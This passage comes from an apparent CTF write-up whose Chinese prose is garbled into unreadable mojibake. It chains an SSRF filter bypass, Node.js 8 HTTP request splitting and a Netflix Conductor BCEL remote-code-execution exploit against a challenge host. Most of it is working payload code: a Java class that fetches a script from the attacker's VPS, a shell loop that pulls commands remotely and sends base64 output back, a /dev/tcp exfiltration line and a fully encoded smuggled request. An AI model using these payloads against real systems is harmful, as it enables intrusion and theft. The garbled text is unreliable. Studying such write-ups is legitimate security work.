å°±èƒ½æˆåŠŸä»¥ç®¡ç†å‘˜èº«ä»½è¿›å…¥ã€‚ æ¥ä¸‹æ¥æ‰“ ssrfâ€¦â€¦ Step 02 SSRF æ‹¿ hintç™»å½•ä¹‹åï¼Œèµµæ€»è¿™é‡Œç»™å‡ºäº†ç½‘ç»œæ¥å£ç›¸å…³çš„å‚æ•°ï¼Œæ¯”èµ›ç¯å¢ƒé‡Œå€’æ²¡æœ‰ï¼Œå¾—ççŒœã€‚ ä¸è¿‡ docker å†…ç½‘é»˜è®¤æ˜¯ 172.1x.0.x å¼€å§‹å€’æ˜¯äº†ã€‚ è¿™é‡Œæäº¤çš„ URL ä¼šè°ƒç”¨ GET /proxy æ¥å£ã€‚å†æ¥çœ‹æºç ã€‚ function SSRF_WAF(url) { const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, '') return isIp(host) &amp;&amp; IP.isPublic(host) } function FLAG_WAF(url) { const pathname = new UrlParse(url).pathname return !pathname.startsWith('/flag') } function OTHER_WAF(url) { return true; } const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] // ... router.get('/proxy', async(req, res, next) =&gt; { if(!req.session.admin) { return res.redirect('/index') } const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) { res.render('base', {title: 'WAF', content: \"Here is the waf...\"}) } else { try { const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`) res.render('base', response.data) } catch(error) { res.render('base', error.message) } } }) è¿™å‡ ä¸ª WAF éœ€è¦è¾“å…¥çš„ URL Host ä¸ºå…¬ç½‘ IPï¼Œä¸”ç›®å½•ä¸ä»¥ /flag å¼€å¤´ã€‚ è¿™ä¸ª NodeJS æœåŠ¡é»˜è®¤æ˜¯å¼€åœ¨ 3000 ç«¯å£ï¼Œä½†æ˜¯å¦‚æœç›´æ¥è®¿é—® http://127.0.0.1:3000/ ä¼šè¢« WAF ç»™æ‹¦ä½ã€‚ è¯•äº†è¯•è®¿é—®è‡ªå·±çš„ VPSï¼Œæ˜¯èƒ½é€šçš„ã€‚ è€ƒè™‘åˆ°æœºå™¨ä¸Šçš„æœåŠ¡ä¸€èˆ¬ç›‘å¬ 0.0.0.0ï¼Œäºæ˜¯æ„é€  URL /proxy?url=http://0.0.0.0:3000/ æˆåŠŸè®¿é—®åˆ°äº†å½“å‰ç«™ç‚¹çš„é¦–é¡µã€‚ æˆ‘ä»¬éœ€è¦è®¿é—®çš„æ˜¯ /flagï¼Œä¸ºäº†ç»•è¿‡ WAFï¼Œå¯ä»¥åˆ©ç”¨ /search æ¥å£ã€‚ router.all('/search', async (req, res, next) =&gt; { if(!/127\\.0\\.0\\.1/.test(req.ip)){ return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'}) } const result = {title: 'Search Success', content: ''} const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try { if(method == 'get') { const response = await axios.get(url) result.content = formatResopnse(response.data) } else if(method == 'post') { const response = await axios.post(url, data) result.content = formatResopnse(response.data) } else { result.title = 'Error' result.content = 'Unsupported Method' } } catch(error) { result.title = 'Error' result.content = error.message } return res.json(result) }) æ„é€  payload /proxy?url=http://0.0.0.0:3000/search?url=http://127.0.0.1:3000/flag {\"title\":\"Search Success\",\"content\":\"{\\\"hint\\\":\\\"someone else also deploy a netflix conductor server in Intranet?\\\"}\"} æç¤ºåœ¨å†…ç½‘ä¸­æœ‰ä¸€ä¸ª netflix conductor serverã€‚ æœä¸€ä¸‹ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾®æœåŠ¡ç¼–æ’å·¥å…·ã€‚ https://github.com/Netflix/conductor https://netflix.github.io/conductor/ Conductor is an orchestration engine that runs in the cloud. Step 03 å†…ç½‘æ‰¾ Conductor æœåŠ¡å®ƒé»˜è®¤æ˜¯å¼€åœ¨ 8080 ç«¯å£ï¼Œäºæ˜¯åœ¨å†…ç½‘ä¸­æ‰¾ä¸€æ‰¾/æ‰«ä¸€æ‰«ã€‚ æœ¬æœºä¸Šæ˜¯æ²¡æœ‰çš„ï¼Œåœ¨ç»™å‡ºçš„å†…ç½‘ç½‘æ®µé‡Œæ‰¾ä¸€æ‰¾ï¼Œå‘ç°æœ‰äº†ã€‚ /proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080 è¿™æ˜¯ä¸€ä¸ª Swagger UIï¼Œä¹Ÿå°±æ˜¯ä¸ª API æ¥å£æ–‡æ¡£ã€‚ &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Swagger UI&lt;/title&gt; &lt;link rel=\"icon\" type=\"image/png\" href=\"images/favicon-32x32.png\" sizes=\"32x32\" /&gt; &lt;link rel=\"icon\" type=\"image/png\" href=\"images/favicon-16x16.png\" sizes=\"16x16\" /&gt; &lt;link href='css/typography.css' media='screen' rel='stylesheet' type='text/css'/&gt; &lt;link href='css/reset.css' media='screen' rel='stylesheet' type='text/css'/&gt; &lt;link href='css/screen.css' media='screen' rel='stylesheet' type='text/css'/&gt; &lt;link href='css/reset.css' media='print' rel='stylesheet' type='text/css'/&gt; &lt;link href='css/print.css' media='print' rel='stylesheet' type='text/css'/&gt; &lt;script src='lib/object-assign-pollyfill.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/jquery-1.8.0.min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/jquery.slideto.min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/jquery.wiggle.min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/jquery.ba-bbq.min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/handlebars-4.0.5.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/lodash.min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/backbone-min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='swagger-ui.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/highlight.9.1.0.pack.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/highlight.9.1.0.pack_extended.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/jsoneditor.min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/marked.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/swagger-oauth.js' type='text/javascript'&gt;&lt;/script&gt; &lt;!-- Some basic translations --&gt; &lt;!-- &lt;script src='lang/translator.js' type='text/javascript'&gt;&lt;/script&gt; --&gt; &lt;!-- &lt;script src='lang/ru.js' type='text/javascript'&gt;&lt;/script&gt; --&gt; &lt;!-- &lt;script src='lang/en.js' type='text/javascript'&gt;&lt;/script&gt; --&gt; &lt;script type=\"text/javascript\"&gt; $(function () { var url = window.location.search.match(/url=([^&amp;]+)/); //http://127.0.0.1:8080/?url=127.0.0.1:8080 if (url &amp;&amp; url.length &gt; 1) { url = decodeURIComponent(url[1]); if (!url.includes('://')) { url = `http://${url}`; } } else { url = window.location.origin; } hljs.configure({ highlightSizeThreshold: 5000 }); // Pre load translate... if(window.SwaggerTranslator) { window.SwaggerTranslator.translate(); } window.swaggerUi = new SwaggerUi({ url: url + \"/api/swagger.json\", dom_id: \"swagger-ui-container\", supportedSubmitMethods: ['get', 'post', 'put', 'delete', 'patch'], onComplete: function(swaggerApi, swaggerUi){ window.swaggerUi.api.setBasePath(\"/api\"); if(typeof initOAuth == \"function\") { initOAuth({ clientId: \"your-client-id\", clientSecret: \"your-client-secret-if-required\", realm: \"your-realms\", appName: \"your-app-name\", scopeSeparator: \" \", additionalQueryStringParams: {} }); } if(window.SwaggerTranslator) { window.SwaggerTranslator.translate(); } }, onFailure: function(data) { log(\"Unable to Load SwaggerUI\"); }, docExpansion: \"none\", jsonEditor: false, defaultModelRendering: 'schema', showRequestHeaders: false }); window.swaggerUi.load(); function log() { if ('console' in window) { console.log.apply(console, arguments); } } }); &lt;/script&gt; &lt;/head&gt; &lt;body class=\"swagger-section\"&gt; &lt;div id='header'&gt; &lt;div class=\"swagger-ui-wrap\"&gt; &lt;a id=\"logo\" href=\"http://swagger.io\"&gt;&lt;img class=\"logo__img\" alt=\"swagger\" height=\"30\" width=\"30\" src=\"images/logo_small.png\" /&gt;&lt;span class=\"logo__title\"&gt;swagger&lt;/span&gt;&lt;/a&gt; &lt;form id='api_selector'&gt; &lt;div class='input'&gt;&lt;input placeholder=\"http://example.com/api\" id=\"input_baseUrl\" name=\"baseUrl\" type=\"text\"/&gt;&lt;/div&gt; &lt;div id='auth_container'&gt;&lt;/div&gt; &lt;div class='input'&gt;&lt;a id=\"explore\" class=\"header__btn\" href=\"#\" data-sw-translate&gt;Explore&lt;/a&gt;&lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"message-bar\" class=\"swagger-ui-wrap\" data-sw-translate&gt;&amp;nbsp;&lt;/div&gt; &lt;div id=\"swagger-ui-container\" class=\"swagger-ui-wrap\"&gt;&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; æ ¹æ® swagger.json æ‹¿åˆ°æ¥å£åˆ—è¡¨ã€‚ /proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080/api/swagger.json ç›´æ¥æ‰¾äº†ä¸ª Swagger UI demoï¼Œç„¶åæœ¬åœ°èµ·ä¸ªæœåŠ¡ï¼ŒæŠŠä¸Šé¢å¾—åˆ°çš„æ•°æ®å¯¼è¿›å»ã€‚ å…ˆçœ‹çœ‹é…ç½®å‚æ•°ã€‚ /proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080/api/admin/config å¾—åˆ° { \"jetty.git.hash\": \"b1e6b55512e008f7fbdf1cbea4ff8a6446d1073b\", \"loadSample\": \"true\", \"io.netty.noUnsafe\": \"true\", \"conductor.jetty.server.enabled\": \"true\", \"io.netty.noKeySetOptimization\": \"true\", \"buildDate\": \"2021-04-03_17:38:09\", \"io.netty.recycler.maxCapacityPerThread\": \"0\", \"conductor.grpc.server.enabled\": \"false\", \"version\": \"2.26.0-SNAPSHOT\", \"queues.dynomite.nonQuorum.port\": \"22122\", \"workflow.elasticsearch.url\": \"es:9300\", \"workflow.namespace.queue.prefix\": \"conductor_queues\", \"user.timezone\": \"GMT\", \"workflow.dynomite.cluster.name\": \"dyno1\", \"sun.nio.ch.bugLevel\": \"\", \"workflow.dynomite.cluster.hosts\": \"dyno1:8102:us-east-1c\", \"workflow.elasticsearch.instanceType\": \"external\", \"db\": \"dynomite\", \"queues.dynomite.threads\": \"10\", \"workflow.namespace.prefix\": \"conductor\", \"workflow.elasticsearch.index.name\": \"conductor\" } ç‰ˆæœ¬ä¸º 2.26.0-SNAPSHOTã€‚ Step 04 Netflix Conductor RCEå‚è€ƒ CVE-2020-9296-Netflix-Conductor-RCE-æ¼æ´åˆ†æ å¤ªé¡¶äº†ï¼ï¼ˆå’±ä¸ä¼š Javaï¼Œå“­å“­ è¿™ä¸ªæ¼æ´å‡ºåœ¨ /api/metadata/taskdefs ä¸Šï¼Œéœ€è¦ POST ä¸€ä¸ª JSON è¿‡å»ï¼Œé‡Œé¢å«æœ‰æ¶æ„çš„ BCEL ç¼–ç ï¼Œå¯ä»¥é€ æˆ RCEã€‚ ä»€ä¹ˆæ˜¯ BCELç¼–ç  å‘¢ï¼Ÿ http://commons.apache.org/proper/commons-bcel/ The Byte Code Engineering Library (Apache Commons BCELâ„¢) is intended to give users a convenient way to analyze, create, and manipulate (binary) Java class files (those ending with .class). Classes are represented by objects which contain all the symbolic information of the given class: methods, fields and byte code instructions, in particular. Byte Code Engineering Library (BCEL)ï¼Œè¿™æ˜¯Apache Software Foundation çš„Jakarta é¡¹ç›®çš„ä¸€éƒ¨åˆ†ã€‚BCELæ˜¯ Java classworking æœ€å¹¿æ³›ä½¿ç”¨çš„ä¸€ç§æ¡†æ¶,å®ƒå¯ä»¥è®©æ‚¨æ·±å…¥ JVM æ±‡ç¼–è¯­è¨€è¿›è¡Œç±»æ“ä½œçš„ç»†èŠ‚ã€‚ å¯ä»¥ç”¨ BCELCodeman è¿™ä¸ªå·¥å…·æ¥ç¼–ç ã€è§£ç ã€‚ Step 05 NodeJS 8 HTTP è¯·æ±‚èµ°ç§æš‚ä¸”å…ˆä¸çœ‹è¿™ä¸ªï¼Œå’±å…ˆçœ‹çœ‹ æ€ä¹ˆä» GET æ¥å£æ‰“ POST è¯·æ±‚ã€‚ NodeJS æœ‰ä¸ª CVE-2018-12116ï¼Œå¯ä»¥åœ¨ path é‡Œæ„é€ å¸¦æœ‰ Unicode çš„æ•°æ®ï¼Œå‘é€éé¢„æœŸçš„è·¯å¾„ç»™æœåŠ¡ç«¯æ¥ç”Ÿæˆå¦ä¸€ä¸ª HTTP è¯·æ±‚ã€‚ æˆ–è€…å¯ä»¥è¯´æ˜¯ HTTP è¯·æ±‚èµ°ç§ï¼ˆHTTP request smugglingï¼‰ã€‚ Node.js: All versions prior to Node.js 6.15.0 and 8.14.0: HTTP request splitting: If Node.js can be convinced to use unsanitized user-provided Unicode data for the path option of an HTTP request, then data can be provided which will trigger a second, unexpected, and user-defined HTTP request to made to the same server. ï¼ˆè‰ï¼Œè¿™ä¹Ÿè¡Œ æ ¹æ®æºç ä¸­çš„ const salt = 'nooooooooodejssssssssss8_issssss_beeeeest' å¯ä»¥çŸ¥é“ç”¨åˆ°çš„æ˜¯ NodeJS 8. ï¼ˆè¿™è°æƒ³åˆ°å‘¢ å”‰ï¼Œå·¨å¤è€çš„ç‰ˆæœ¬ï¼Œå¥½çƒ¦æ‰‹ä¸Šæ²¡ç¯å¢ƒ docker å¤§æ³•å¥½å•Šï¼ æœä¸€ä¸‹ tag https://hub.docker.com/_/node?tab=description&amp;page=1&amp;ordering=last_updated&amp;name=8.13 ï¼ˆæœ¬æ¥çœ‹å½±å“èŒƒå›´åˆ° 8.14.0 çš„ï¼Œäºæ˜¯è¯•äº†ä¸€ä¸‹ 8.14.0-alpineï¼Œç„¶è€Œå‘ç°æŠ¥é”™ TypeError: Request path contains unescaped charactersï¼Œçœ‹æ¥è²Œä¼¼ä¿®äº† docker pull node:8.13.0-alpine docker run -itd --name node8.13-test node:8.13.0-alpine docker exec -it node8.13-test /bin/sh # è¿›å…¥dockeré‡Œæ‰§è¡Œ npm i axios node ç„¶åç»™è‡ªå·±æœåŠ¡å™¨æ‰“æ‰“è¯•è¯•ï¼ŒæœåŠ¡å™¨ä¸Šèµ·ä¸ªæœåŠ¡ç›‘å¬ç«¯å£ã€‚ Node é‡Œæ‰§è¡Œ const axios = require('axios') var s = 'http://VPSIP/?param=x\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:{\\u0120}127.0.0.1:3000\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/private' axios.get(s).then((r) =&gt; console.log(r.data)).catch(console.error) å¯ä»¥çœ‹åˆ°è¯·æ±‚æˆåŠŸæ¢è¡Œäº†ï¼Œè€Œä¸”å¤¹å¸¦äº†ä¸€ä¸ªæ–°çš„è¯·æ±‚ã€‚ å†å¤¹å¸¦ä¸€ä¸ª POST è¯·æ±‚è¯•è¯• var s = 'http://VPSIP/\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:{\\u0120}127.0.0.1:3000\\u{010D}\\u{010A}\\u{010D}\\u{010A}POST\\u{0120}/search?url=http://10.0.66.14:8080/api/metadata/taskdefs\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:127.0.0.1:3000\\u{010D}\\u{010A}Content-Type:application/json\\u{010D}\\u{010A}Content-Length:15\\u{010D}\\u{010A}\\u{010D}\\u{010A}MiaoTony Meow~~\\u{010D}\\u{010A}\\u{010D}\\u{010A}\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/private' å¥½è€¶ï¼ŒPOST è¯·æ±‚æ„é€ æˆåŠŸäº†ï¼ Step 06 å€ŸåŠ© SSRF æ‰“ Conductor RCEé‚£å†å›æ¥çœ‹ Conductor RCEã€‚ ç›´æ¥æ”¹ èµµæ€»çš„ Exploit å¥½äº†ã€‚ è¿™é‡Œå…¶å®è¯•äº†æ— æ•°æ¬¡ï¼Œå‘ç°éƒ½åå¼¹ä¸äº† shellï¼Œä¼°è®¡æ˜¯æ²¡æœ‰ bashï¼Œä½†ç”šè‡³ç›´æ¥ cat /flag &gt; /dev/tcp/IP/PORT ä¹Ÿå‡ºä¸æ¥ï¼Œä¸æ‡‚ä¸ºå•¥ã€‚ã€‚ï¼ˆéš¾é“é‡å®šå‘ä¸è¡Œï¼Ÿ ï¼ˆå¿ƒæ€ç‚¸äº†ï¼ï¼ï¼å•Šå•Šå•Šå•Šå•Šå•Šå•Šï¼ æœ€åæ²¡åŠæ³•ï¼Œè¿˜æ˜¯å…ˆæŠŠ shell è„šæœ¬å†™å…¥æ–‡ä»¶ï¼Œå† sh filename æ‰§è¡Œä»£ç ã€‚ ä¸ºäº†æ–¹ä¾¿ä¿®æ”¹å‘½ä»¤ï¼Œå°±åœ¨ VPS ä¸Šæ”¾è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œé¶æœºä¸Šçš„ shell é‡Œåˆ©ç”¨ wget ä¸‹æ¥åæ‰§è¡Œå‘½ä»¤ï¼Œå†åˆ©ç”¨ URL ä¼ å‚æŠŠæ‰§è¡Œç»“æœè¿”å›ç»™ VPSã€‚ Evil.java public class Evil { public Evil() { try { Runtime.getRuntime().exec(\"wget http://VPSIP:PORT/ -O /tmp/miaotony\"); } catch (Exception ex) { ex.printStackTrace(); } } public static void main(final String[] array) { } } ç„¶åç¼–è¯‘å¾—åˆ°ä¸€ä¸ª Evil.classï¼Œå†åˆ©ç”¨ BCELCodeman è½¬æ¢ä¸º BCEL ç¼–ç ã€‚ javac Evil.java java -jar BCELCodeman.jar e Evil.class ï¼ˆå–µå–µè¿™é‡Œç”¨çš„ java ç‰ˆæœ¬æ˜¯ # javac -version javac 1.8.0_221 # java -version java version \"1.8.0_221\" Java(TM) SE Runtime Environment (build 1.8.0_221-b11) Java HotSpot(TM) 64-Bit Server VM (build 25.221-b11, mixed mode) ç»„åˆåˆ° JSON é‡Œ [{\"name\":\"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5d$_$DA$U$3d$b3$adn$bbZm$d1R$9f$c5......').newInstance().class}\",\"ownerEmail\":\"test@example.org\",\"retryCount\":\"3\",\"timeoutSeconds\":\"1200\",\"inputKeys\":[\"sourceRequestId\",\"qcElementType\"],\"outputKeys\":[\"state\",\"skipped\",\"result\"],\"timeoutPolicy\":\"TIME_OUT_WF\",\"retryLogic\":\"FIXED\",\"retryDelaySeconds\":\"600\",\"responseTimeoutSeconds\":\"3600\",\"concurrentExecLimit\":\"100\",\"rateLimitFrequencyInSeconds\":\"60\",\"rateLimitPerFrequency\":\"50\",\"isolationgroupId\":\"myIsolationGroupId\"}] æœ€åæ„é€  POST è¯·æ±‚ã€‚ POST /api/metadata/taskdefs? HTTP/1.1 Host: 10.0.64.14:8080 Content-Type: application/json Content-Length:1408 [{\"name\":\"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5d$_$DA$U$3d$b3$adn$bbZm$d1R$9f$c5......').newInstance().class}\",\"ownerEmail\":\"test@example.org\",\"retryCount\":\"3\",\"timeoutSeconds\":\"1200\",\"inputKeys\":[\"sourceRequestId\",\"qcElementType\"],\"outputKeys\":[\"state\",\"skipped\",\"result\"],\"timeoutPolicy\":\"TIME_OUT_WF\",\"retryLogic\":\"FIXED\",\"retryDelaySeconds\":\"600\",\"responseTimeoutSeconds\":\"3600\",\"concurrentExecLimit\":\"100\",\"rateLimitFrequencyInSeconds\":\"60\",\"rateLimitPerFrequency\":\"50\",\"isolationgroupId\":\"myIsolationGroupId\"}] å† URL ç¼–ç ä¸€ä¸‹ï¼Œè¿˜éœ€è¦å€ŸåŠ© /proxy æ¥å£ SSRF ä»£ç†è¯·æ±‚ã€‚ å‚è€ƒä¸€ä¸‹èµµæ€»çš„ JS è„šæœ¬ã€‚ post_payload = '[\\u{017b}\\u{0122}name\\u{0122}:\\u{0122}$\\u{017b}\\u{0127}1\\u{0127}.getClass().forName(\\u{0127}com.sun.org.apache.bcel.internal.util.ClassLoader\\u{0127}).newInstance().loadClass(\\u{0127}$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5d$_$DA$U$3d$b3$adn$bbZm$d1R$9f$c5$83$ov$e3$p$aa$88$X$e1$a9$3e$a2$N$P$5el$d7$a4$a6$da$edfM$R$7f$c8$b3$X$c4$83$l$e0G$e1$c......\\u{0127}).newInstance().class\\u{017d}\\u{0122},\\u{0122}ownerEmail\\u{0122}:\\u{0122}test@example.org\\u{0122},\\u{0122}retryCount\\u{0122}:\\u{0122}3\\u{0122},\\u{0122}timeoutSeconds\\u{0122}:\\u{0122}1200\\u{0122},\\u{0122}inputKeys\\u{0122}:[\\u{0122}sourceRequestId\\u{0122},\\u{0122}qcElementType\\u{0122}],\\u{0122}outputKeys\\u{0122}:[\\u{0122}state\\u{0122},\\u{0122}skipped\\u{0122},\\u{0122}result\\u{0122}],\\u{0122}timeoutPolicy\\u{0122}:\\u{0122}TIME_OUT_WF\\u{0122},\\u{0122}retryLogic\\u{0122}:\\u{0122}FIXED\\u{0122},\\u{0122}retryDelaySeconds\\u{0122}:\\u{0122}600\\u{0122},\\u{0122}responseTimeoutSeconds\\u{0122}:\\u{0122}3600\\u{0122},\\u{0122}concurrentExecLimit\\u{0122}:\\u{0122}100\\u{0122},\\u{0122}rateLimitFrequencyInSeconds\\u{0122}:\\u{0122}60\\u{0122},\\u{0122}rateLimitPerFrequency\\u{0122}:\\u{0122}50\\u{0122},\\u{0122}isolationgroupId\\u{0122}:\\u{0122}myIsolationGroupId\\u{0122}\\u{017d}]' console.log(encodeURI(encodeURI(encodeURI('http://0.0.0.0:3000/\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:127.0.0.1:3000\\u{010D}\\u{010A}\\u{010D}\\u{010A}POST\\u{0120}/search?url=http://10.0.64.14:8080/api/metadata/taskdefs\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:127.0.0.1:3000\\u{010D}\\u{010A}Content-Type:application/json\\u{010D}\\u{010A}Content-Length:' + post_payload.length + '\\u{010D}\\u{010A}\\u{010D}\\u{010A}' + post_payload + '\\u{010D}\\u{010A}\\u{010D}\\u{010A}\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/private')))) æ‰“çš„æ—¶å€™è®°å¾—æ”¹ä¸€ä¸‹ $$BCEL$$ é‚£éƒ¨åˆ†ï¼Œä»¥åŠ conductor é‚£å°é¶æœºçš„ IPã€‚ å¾—åˆ° http://0.0.0.0:3000/%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0/search?url=http://10.0.64.14:8080/api/metadata/taskdefs%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258AContent-Type:application/json%2525C4%25258D%2525C4%25258AContent-Length:1536%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%25255B%2525C5%2525BB%2525C4%2525A2name%2525C4%2525A2:%2525C4%2525A2$%2525C5%2525BB%2525C4%2525A71%2525C4%2525A7.getClass().forName(%2525C4%2525A7com.sun.org.apache.bcel.internal.util.ClassLoader%2525C4%2525A7).newInstance().loadClass(%2525C4%2525A7$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5dO$gA$U$3d$b3$m$L$db$a5$7cXh$b1$l$82$3e$I$9a$b2$rAi$d1$f8$d2$d0$tZ$8c$Q$7d$f0$c5a$9d$d0$b1$ecG$d6$c1$da_$d4g_$b4$f1$c1$l$e0$8f$b2$bd$b31$d2$a4$9dd$ce$cc$3d$f7$cc$b9wf$ee$eeon$B$b4$b1j$n$8dg$WJ$u$a7$f1$5c$af$_LT$y$y$60$c9$c4K$T$af$YR$3b$d2$97j$97$nQo$i0$q$3f$G$t$82$n$d7$97$be$f82$f3$c6$o$g$f1$f1$94$98$ecPq$f7$dbg$k$c6q$7c$baBr$8fK$9f$a1$5c$3f$ea$9f$f2s$eeL$b9$3fq$86$w$92$fed$5b$dbY$c3$60$W$b9$e2$93$d4$W$99$de$b9$9c6$b5$ceF$G$96$89$d76$de$60$99$c1$f9$3e$R$aa$faU$a9$b0$eb8$edN$f3$c3V$b3$b5$d5n$b66$db$ddN$eb$fd$bb$ea$dbA$d5Q$5e$e8x$92$H$w$f0$7f$d8$a8$a2$c6$b08$_$d9$bbpE$a8d$e0$dbX$81E$7d$e9R$M$f9$b9b0$3e$V$aeb$u$cc$a9$fd$99$af$a4G$8dYT$fe1$u$d5$h$fd$7f4$dbd$v$$$84$cb$b0V$ff$cfM$ff$a2$f6$a2$c0$Vggt$m$XRR$c5$cf6$8a$b8$xP$83I$df$a1$87$B$a6_$80$f0$JE$c7$U$h$b4$96$d7$af$c1$7e$c1$u$s$ae$90$3c$fc$89t$7f$e3$K$a9KR$r$91E$9e$7e$cd$80M$ba$r$a4$I$T$c4$$$Q$9f$a1$8c$89$C9$97$c81K$99$3c$8c$df$E$cc$c4S$N$b9d$ac$v$3cT$ab$d0dz$5e$c6$hm$98$8a$89$ya1nn$f1$P$LRz$KA$C$A$A%2525C4%2525A7).newInstance().class%2525C5%2525BD%2525C4%2525A2,%2525C4%2525A2ownerEmail%2525C4%2525A2:%2525C4%2525A2test@example.org%2525C4%2525A2,%2525C4%2525A2retryCount%2525C4%2525A2:%2525C4%2525A23%2525C4%2525A2,%2525C4%2525A2timeoutSeconds%2525C4%2525A2:%2525C4%2525A21200%2525C4%2525A2,%2525C4%2525A2inputKeys%2525C4%2525A2:%25255B%2525C4%2525A2sourceRequestId%2525C4%2525A2,%2525C4%2525A2qcElementType%2525C4%2525A2%25255D,%2525C4%2525A2outputKeys%2525C4%2525A2:%25255B%2525C4%2525A2state%2525C4%2525A2,%2525C4%2525A2skipped%2525C4%2525A2,%2525C4%2525A2result%2525C4%2525A2%25255D,%2525C4%2525A2timeoutPolicy%2525C4%2525A2:%2525C4%2525A2TIME_OUT_WF%2525C4%2525A2,%2525C4%2525A2retryLogic%2525C4%2525A2:%2525C4%2525A2FIXED%2525C4%2525A2,%2525C4%2525A2retryDelaySeconds%2525C4%2525A2:%2525C4%2525A2600%2525C4%2525A2,%2525C4%2525A2responseTimeoutSeconds%2525C4%2525A2:%2525C4%2525A23600%2525C4%2525A2,%2525C4%2525A2concurrentExecLimit%2525C4%2525A2:%2525C4%2525A2100%2525C4%2525A2,%2525C4%2525A2rateLimitFrequencyInSeconds%2525C4%2525A2:%2525C4%2525A260%2525C4%2525A2,%2525C4%2525A2rateLimitPerFrequency%2525C4%2525A2:%2525C4%2525A250%2525C4%2525A2,%2525C4%2525A2isolationgroupId%2525C4%2525A2:%2525C4%2525A2myIsolationGroupId%2525C4%2525A2%2525C5%2525BD%25255D%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258AGET%2525C4%2525A0/private ç„¶ååœ¨è‡ªå·± VPS ä¸Šèµ·ä¸€ä¸ª web æœåŠ¡ï¼Œè®¿é—® http://VPSIP:PORT/ çš„æ—¶å€™è¿”å›ä¸€ä¸ª shell è„šæœ¬ã€‚ #!/bin/sh wget -O- -q http://VPSIP:PORT/`wget -O- -q http://VPSIP:PORT/command|sh|base64|awk '{printf(\"%s\",$0)}'` | echo åŒæ—¶åœ¨ç›‘å¬ http://VPSIP:PORT/command çš„åœ°æ–¹æ”¾ä½ è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ¯”å¦‚ whoami &amp;&amp; cat /flag è¿™é‡Œæ‰§è¡Œçš„æ—¶å€™ä¼šè®¿é—® http://VPSIP:PORT/commandï¼Œæ‰§è¡Œè¿™æ¡å‘½ä»¤ï¼Œå†è¿›è¡Œ base64 ç¼–ç ï¼Œæœ€åæŠŠæ¢è¡Œç»™å»æ‰ã€‚æœ€åæŠŠæ‰§è¡Œçš„ç»“æœè¿”å›åˆ° http://VPSIP:PORT/xxx è¿™ä¸ªè·¯ç”±ä¸‹ï¼Œæ ¹æ®æœåŠ¡å™¨çš„æ—¥å¿—ï¼ŒæŠŠ path base64 è§£ç ä¸€ä¸‹å°±èƒ½æ‹¿åˆ°æ‰§è¡Œçš„ç»“æœäº†ã€‚ å¦‚æœä¸å»æ‰æ¢è¡Œçš„è¯ base64 å¤šè¡Œçš„è¯ä¼šä¸¢ä¿¡æ¯ï¼Œæ‰§è¡Œè¿˜ä¼šè®¤ä¸ºæ˜¯å¤šä¸ª wget å‘½ä»¤äºæ˜¯æŠ¥é”™ã€‚ã€‚ å†æŒ‰ç…§è¿™ä¸€æ­¥çš„æ€è·¯ï¼ŒåŒç†ç”Ÿæˆä¸€ä¸ª æ‰§è¡Œ /tmp/miaotony çš„ URLã€‚ public class Evil { public Evil() { try { Runtime.getRuntime().exec(\"sh /tmp/miaotony\"); // &lt;======== } catch (Exception ex) { ex.printStackTrace(); } } public static void main(final String[] array) { } } BCEL: 